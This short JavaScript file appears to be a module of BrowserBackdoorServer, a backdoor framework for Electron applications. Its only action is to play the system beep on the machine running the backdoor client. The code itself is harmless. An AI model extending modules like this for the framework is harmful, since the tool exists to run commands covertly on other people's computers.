/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Plays the system beep.
 * Parameters: None
 * Returns: undefined
 * Author: IMcPwn
 */

if (typeof electron === typeof undefined) electron = require('electron');

return electron.shell.beep();
